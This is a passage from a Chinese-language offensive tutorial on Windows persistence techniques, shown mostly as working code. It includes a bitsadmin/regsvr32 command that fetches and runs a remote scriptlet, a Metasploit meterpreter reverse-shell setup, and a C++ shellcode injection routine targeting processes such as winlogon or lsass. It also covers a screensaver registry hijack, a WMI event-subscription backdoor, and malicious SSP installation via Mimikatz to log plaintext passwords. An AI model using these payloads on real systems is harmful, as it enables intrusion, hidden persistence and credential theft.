<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">bitsadmin </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">SetNotifyCmdLine backdoor regsvr32</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">exe </span><span class="token string" style="color:#e3116c">&quot;/s /n /u /i:http://10.0.2.21:8080/FHXSd9.sct scrobj.dll&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">bitsadmin </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">resume backdoor</span><br></span></code></pre></div></div>
<p>Metasploit框架可用于通过<code>web_delivery</code>模块捕获payload。</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">use exploit</span><span class="token operator" style="color:#393A34">/</span><span class="token plain">multi</span><span class="token operator" style="color:#393A34">/</span><span class="token plain">script</span><span class="token operator" style="color:#393A34">/</span><span class="token plain">web_delivery</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin">set</span><span class="token plain"> target </span><span class="token number" style="color:#36acaa">3</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin">set</span><span class="token plain"> payload windows</span><span class="token operator" style="color:#393A34">/</span><span class="token plain">x64</span><span class="token operator" style="color:#393A34">/</span><span class="token plain">meterpreter</span><span class="token operator" style="color:#393A34">/</span><span class="token plain">reverse_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin">set</span><span class="token plain"> LHOST </span><span class="token number" style="color:#36acaa">10.0</span><span class="token number" style="color:#36acaa">.2</span><span class="token number" style="color:#36acaa">.21</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exploit</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="BITS Jobs – Regsvr32" src="/assets/images/894761-20191111110318972-2018078810-441da73d9c1f6580efd2350934c7b138.png" width="777" height="426" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="进程注入">进程注入<a href="#进程注入" class="hash-link" aria-label="进程注入的直接链接" title="进程注入的直接链接">​</a></h2>
<p>之所以把注入也放到权限维持来说,因为注入更加隐蔽,尤其是拿到高权限后,难以被发现</p>
<p><strong>如果是user权限可以考虑注入exploer.exe 如果是system权限则可以注入winlogon或者lassa</strong></p>
<p>关于dll注入网上已经有很多教程,包括突破session 0,使用ZwCreateThreadEx创建一个线程</p>
<p>同样还有shellcode注入</p>
<p>一个demo</p>
<div class="language-C++ language-c++ codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c++ codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">DWORD CeatRemoThread(DWORD pid)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">{</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">HANDLE hThread;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">DWORD dwOldProtect;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">DWORD dwThreadId;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">int shellcode_size = sizeof(buf);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">//混淆</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">char* newBuf;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">decrypt(buf, shellcode_size, (LPVOID*)&amp;newBuf);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">HANDLE hHandle = OpenProcess(PROCESS_ALL_ACCESS, false, pid);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">if (hHandle == NULL)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">{</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">printf(&quot;openprocessError&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">free(newBuf);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">return FALSE;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">LPVOID Memory = VirtualAllocEx(hHandle, NULL, sizeof(newBuf) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">SIZE_T dwSize = 0;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">WriteProcessMemory(hHandle, Memory, newBuf, shellcode_size / 3, &amp;dwSize);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">//Sleep(3000);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">VirtualProtectEx(hHandle, Memory, shellcode_size / 3, PAGE_EXECUTE, &amp;dwOldProtect);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">HMODULE hNtdll = LoadLibrary(L&quot;ntdll.dll&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">if (hNtdll == NULL)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">{</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">printf(&quot;[!] LoadNTdll Error,Error is:%d\n&quot;, GetLastError());</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">return FALSE;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">else</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">{</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">printf(&quot;[*] Load ntdll.dll Successfully!\n&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#ifdef _WIN64</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">typedef DWORD(WINAPI* typedef_ZwCreateThreadEx)(</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">PHANDLE ThreadHandle,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ACCESS_MASK DesiredAccess,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">LPVOID ObjectAttributes,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">HANDLE ProcessHandle,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">LPTHREAD_START_ROUTINE lpStartAddress,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">LPVOID lpParameter,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ULONG CreateThreadFlags,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">SIZE_T ZeroBits,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">SIZE_T StackSize,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">SIZE_T MaximumStackSize,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">LPVOID pUnkown</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#else</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">typedef DWORD(WINAPI* typedef_ZwCreateThreadEx)(</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">PHANDLE ThreadHandle,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ACCESS_MASK DesiredAccess,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">LPVOID ObjectAttributes,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">HANDLE ProcessHandle,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">LPTHREAD_START_ROUTINE lpStartAddress,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">LPVOID lpParameter,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">BOOL CreateSuspended,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">DWORD dwStackSize,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">DWORD dw1,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">DWORD dw2,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">LPVOID pUnkown</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#endif</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">typedef_ZwCreateThreadEx ZwCreateThreadEx = NULL;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ZwCreateThreadEx = (typedef_ZwCreateThreadEx)::GetProcAddress(hNtdll, &quot;ZwCreateThreadEx&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">if (ZwCreateThreadEx == NULL)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">{</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">printf(&quot;[!] Get ZwCreateThreadEx Address Error,Error is:%d\n&quot;, GetLastError());</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">return FALSE;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">else</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">{</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">printf(&quot;[*] Get ZwCreateThreadEx Address Successfully! Address is %x\n&quot;, ZwCreateThreadEx);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">HANDLE hRemoteThread = NULL;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">DWORD ZwRet = 0;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ZwRet = ZwCreateThreadEx(&amp;hRemoteThread, PROCESS_ALL_ACCESS, NULL, hHandle,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">(LPTHREAD_START_ROUTINE)Memory, NULL, 0, 0, 0, 0, NULL);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">if (hRemoteThread == NULL)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">{</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">printf(&quot;[!] Creat RemoteThread Error,Error is:%d\n&quot;, GetLastError());</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">getchar();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">VirtualFreeEx(hHandle, Memory, 0, MEM_RELEASE);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">CloseHandle(hHandle);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">FreeLibrary(hNtdll);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">return FALSE;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">WaitForSingleObject(hRemoteThread, INFINITE);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">return TRUE;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="屏幕保护程序">屏幕保护程序<a href="#屏幕保护程序" class="hash-link" aria-label="屏幕保护程序的直接链接" title="屏幕保护程序的直接链接">​</a></h2>
<p><strong>利用前提:对方开启了屏幕保护</strong></p>
<p>屏幕保护程序，当初的设计是为了防止长期屏幕的显示，预防老化与缩短屏幕显示器老化的一种保护程序。</p>
<p>在对方开启屏幕保护的情况下，我们可以修改屏保程序为我们的恶意程序从而达到后门持久化的目的，攻击者可以利用屏幕保护程序来隐藏shell，达到一定的权限维持。</p>
<p>注册表位置:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">HKEY_CURRENT_USER\Control Panel\Desktop</span><br></span></code></pre></div></div>
<p>命令行修改:</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">reg add </span><span class="token string" style="color:#e3116c">&quot;HKEY_CURRENT_USER\Control Panel\Desktop&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">v SCRNSAVE</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">EXE </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">d C:\Windows\System32\cmd</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">exe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">New-ItemProperty</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Path </span><span class="token string" style="color:#e3116c">&#x27;HKCU:\Control Panel\Desktop\&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Name </span><span class="token string" style="color:#e3116c">&#x27;SCRNSAVE.EXE&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Value </span><span class="token string" style="color:#e3116c">&#x27;c:\tmp\pentestlab.exe&#x27;</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="图片" src="/assets/images/640-20210706202127819-3ef266e7a0d6572b03f66f339db4c654.png" width="1067" height="538" class="img_ev3q"></p>
<p>这里可以改成我们的马，达到维持权限的效果,具体时间为注册表的ScreenSaverTimeout值有关</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="wmi构造无文件后门">WMI构造无文件后门<a href="#wmi构造无文件后门" class="hash-link" aria-label="WMI构造无文件后门的直接链接" title="WMI构造无文件后门的直接链接">​</a></h2>
<p>WMI是一项Windows管理技术，其全称是Windows Management Instrumentation，即Windows管理规范。大多数基于Windows的软件依赖于此服务。</p>
<p>无文件无进程使得他非常隐蔽成为后门，但由于他的隐蔽性现在被大多数杀软所查杀。</p>
<p>通过与Powershell命令配合使用可以实现无文件，具有良好的隐蔽性也是目前较为常用的持久化手段。</p>
<p>推荐文章</p>
<blockquote>
<p><a href="https://wooyun.js.org/drops/WMI%20%E7%9A%84%E6%94%BB%E5%87%BB%EF%BC%8C%E9%98%B2%E5%BE%A1%E4%B8%8E%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E4%B9%8B%E6%94%BB%E5%87%BB%E7%AF%87.html" target="_blank" rel="noopener noreferrer">https://wooyun.js.org/drops/WMI%20%E7%9A%84%E6%94%BB%E5%87%BB%EF%BC%8C%E9%98%B2%E5%BE%A1%E4%B8%8E%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E4%B9%8B%E6%94%BB%E5%87%BB%E7%AF%87.html</a></p>
</blockquote>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token variable" style="color:#36acaa">$filterName</span><span class="token plain"> = </span><span class="token string" style="color:#e3116c">&#x27;SD&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token variable" style="color:#36acaa">$consumerName</span><span class="token plain"> = </span><span class="token string" style="color:#e3116c">&#x27;SDD&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token variable" style="color:#36acaa">$exePath</span><span class="token plain"> = </span><span class="token string" style="color:#e3116c">&#x27;C:\Windows\System32\cmd.exe&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token variable" style="color:#36acaa">$Query</span><span class="token plain"> = </span><span class="token string" style="color:#e3116c">&quot;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA &#x27;Win32_PerfFormattedData_PerfOS_System&#x27; AND TargetInstance.SystemUpTime &gt;=200 AND TargetInstance.SystemUpTime &lt; 320&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token variable" style="color:#36acaa">$WMIEventFilter</span><span class="token plain"> = </span><span class="token function" style="color:#d73a49">Set-WmiInstance</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token keyword" style="color:#00009f">Class</span><span class="token plain"> __EventFilter </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">NameSpace </span><span class="token string" style="color:#e3116c">&quot;root\subscription&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Arguments @</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain">Name=</span><span class="token variable" style="color:#36acaa">$filterName</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain">EventNameSpace=</span><span class="token string" style="color:#e3116c">&quot;root\cimv2&quot;</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain">QueryLanguage=</span><span class="token string" style="color:#e3116c">&quot;WQL&quot;</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain">Query=</span><span class="token variable" style="color:#36acaa">$Query</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">ErrorAction Stop</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token variable" style="color:#36acaa">$WMIEventConsumer</span><span class="token plain"> = </span><span class="token function" style="color:#d73a49">Set-WmiInstance</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token keyword" style="color:#00009f">Class</span><span class="token plain"> CommandLineEventConsumer </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Namespace </span><span class="token string" style="color:#e3116c">&quot;root\subscription&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Arguments @</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain">Name=</span><span class="token variable" style="color:#36acaa">$consumerName</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain">ExecutablePath=</span><span class="token variable" style="color:#36acaa">$exePath</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain">CommandLineTemplate=</span><span class="token variable" style="color:#36acaa">$exePath</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">Set-WmiInstance</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token keyword" style="color:#00009f">Class</span><span class="token plain"> __FilterToConsumerBinding </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Namespace </span><span class="token string" style="color:#e3116c">&quot;root\subscription&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Arguments @</span><span class="token punctuation" style="color:#393A34">{</span><span class="token keyword" style="color:#00009f">Filter</span><span class="token plain">=</span><span class="token variable" style="color:#36acaa">$WMIEventFilter</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain">Consumer=</span><span class="token variable" style="color:#36acaa">$WMIEventConsumer</span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre></div></div>
<p>可以使用Autoruns进行查看</p>
<p><img decoding="async" loading="lazy" alt="图片" src="/assets/images/640-20210706204240545-4c9bc0f3f98c9a51524953e3e5dbdce7.png" width="1080" height="551" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="安全支持提供者">安全支持提供者<a href="#安全支持提供者" class="hash-link" aria-label="安全支持提供者的直接链接" title="安全支持提供者的直接链接">​</a></h2>
<p>安全支持提供程序（SSP）是Windows API，用于扩展Windows身份验证机制。LSASS进程正在Windows启动期间加载安全支持提供程序DLL。这种行为使红队的攻击者可以删除一个任意的SSP DLL以便与LSASS进程进行交互并记录该进程中存储的所有密码，或者直接用恶意的SSP对该进程进行修补而无需接触磁盘。</p>
<p>该技术可用于收集一个系统或多个系统中的凭据，并将这些凭据与另一个协议（例如RDP，WMI等）结合使用，以免干扰检测，从而在网络中保持持久性。向主机注入恶意安全支持提供程序需要管理员级别的特权，并且可以使用两种方法：</p>
<ol>
<li>注册SSP DLL</li>
<li>加载到内存</li>
</ol>
<p>Mimikatz，Empire和PowerSploit支持这两种方法，可以在红队操作中使用。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="mimikatz">Mimikatz<a href="#mimikatz" class="hash-link" aria-label="Mimikatz的直接链接" title="Mimikatz的直接链接">​</a></h3>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="方法一">方法一<a href="#方法一" class="hash-link" aria-label="方法一的直接链接" title="方法一的直接链接">​</a></h4>
<p>项目<a href="https://github.com/gentilkiwi/mimikatz/releases" target="_blank" rel="noopener noreferrer">Mimikatz</a>提供了一个DLL文件（mimilib.dll），可以将其放到与LSASS进程（System32 ）相同的位置，以便为访问受感染主机的任何用户获得纯文本凭据。</p>
<p>将文件传输到<code>C:\Windows\System32\</code>位置后，需要修改注册表项以包括新的安全支持提供程序<code>mimilib</code>。</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">reg add </span><span class="token string" style="color:#e3116c">&quot;hklm\system\currentcontrolset\control\lsa\&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">v </span><span class="token string" style="color:#e3116c">&quot;Security Packages&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">d </span><span class="token string" style="color:#e3116c">&quot;kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">t REG_MULTI_SZ</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="img" src="/assets/images/894761-20191111133557520-730469174-8ed1629c9c77290c6f582913921e56ee.png" width="1024" height="268" class="img_ev3q"></p>
<p>查看“安全软件包”注册表项将验证是否已注入恶意安全支持提供程序。</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="img" src="/assets/images/894761-20191111133629156-1972426718-be98a2a7ee1d3b150cfd4881c4c2fc5a.png" width="1024" height="564" class="img_ev3q"></p>
<p>由于注册表已被篡改并且DLL存储在系统中，因此该方法将在重新启动后继续存在。当域用户再次通过系统进行身份验证时，将创建一个名为kiwissp的新文件，该文件将记录帐户的凭据。</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">C:\Windows\System32\kiwissp.log</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="img" src="/assets/images/894761-20191111133654275-293344594-940286a40a3f70e617050a3cfa43e23d.png" width="1024" height="477" class="img_ev3q"></p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="方法二">方法二<a href="#方法二" class="hash-link" aria-label="方法二的直接链接" title="方法二的直接链接">​</a></h4>
<p>Mimikatz通过向LSASS注入新的安全支持提供程序（SSP）来支持内存技术选项。此技术不需要将mimilib.dll放入磁盘或创建注册表项。但是，缺点是在重新启动过程中不会持续存在。</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">privilege::debug</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">misc::memssp</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="img" src="/assets/images/894761-20191111133714579-1576487799-8e613636861bcb682b86b817b1af7091.png" width="1024" height="525" class="img_ev3q"></p>
<p>当用户再次通过系统进行身份验证时，将在System32中创建一个日志文件，其中将包含纯文本用户密码。</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">C:\Windows\System32\mimilsa.log</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="img" src="/assets/images/894761-20191111133731269-394907794-045fe142500472e91fd757648687bcff.png" width="1008" height="471" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="powersploit-1">PowerSploit<a href="#powersploit-1" class="hash-link" aria-label="PowerSploit的直接链接" title="PowerSploit的直接链接">​</a></h3>
<p><a href="https://github.com/PowerShellMafia/PowerSploit" target="_blank" rel="noopener noreferrer">PowerSploit</a>包含两个可以执行相同任务的脚本。在Mimikatz的PowerShell变体“ <strong>Invoke-Mimikatz</strong> ”中，执行以下命令将使用内存中技术。</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Import</span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Module </span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">\Invoke</span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Mimikatz</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">ps1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Invoke</span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Mimikatz </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Command </span><span class="token string" style="color:#e3116c">&quot;misc::memssp&quot;</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="PowerSploit – Mimikatz SSP" src="/assets/images/894761-20191111133929436-353413364-03b53451e99d0f0b818371684858afdc.png" width="797" height="392" class="img_ev3q"></p>
<p>或者，将恶意的SSP DDL文件传输到目标主机并使用模块<strong>Install-SSP</strong>将DLL复制到System32，并将自动修改相关的注册表项。</p>
